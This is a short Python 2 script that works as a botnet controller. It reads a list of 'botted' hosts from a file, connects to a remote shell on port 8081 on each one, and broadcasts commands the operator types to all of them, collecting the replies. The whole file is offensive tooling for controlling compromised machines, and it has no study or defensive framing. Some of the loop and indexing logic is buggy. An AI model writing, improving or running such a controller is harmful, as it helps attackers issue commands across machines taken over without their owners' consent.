#!/usr/bin/python2

import socket,select,  sys, time

botted_hosts = open('botted_hosts.txt', 'r') 
port = '8081'
hosts = []
cons = []
datare = [] 
for line in botted_hosts: 
	host = line.strip("\n")
	hosts.append(host)
print "Connected to all bots" 
socks = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for i in range(0,len(hosts))]
while 1: 
	print "Enter  command: " 
	command = sys.stdin.readline().split()
	i = 0
	for sock in socks:
		if len(cons) < len(hosts):  
			host = hosts[i]
			sock.connect((host, 8081))
			cons.append(sock)
		else:
			host = hosts[i]
			sock = cons[i]
		sock.settimeout(0.2)  
		if (command[0] == "exit"): 
			print "Good-bye!" 
			sock.sendall('exit') #sends exit command to netshell
			sock.shutdown(2) #closes sock
			cons.remove(sock) #removes the sock from the lists
			socks.remove(sock)
			sys.exit(0)
			break
		else: 
			
			try:
				c = ' '.join(command)
				sock.sendall(c)
				data = ''
				while True: 
					try: 
						part = sock.recv(1024)
						if not part: #if part is blank break while
							break;
					except socket.error, e: 
						print "Response from " + host + ": \n" + data + "\n"
						break
					else:
						data += part
			except socket.error, e: 
				print str(e) 
				print "TCP Socket Error"
				sock.close()
				break 
			except socket.timeout, e: 
				print str(e) 
				print "TCP Socket Timeout"
		if i > len(host): 
			i = 0

		else:
			i += 1

sock.close()


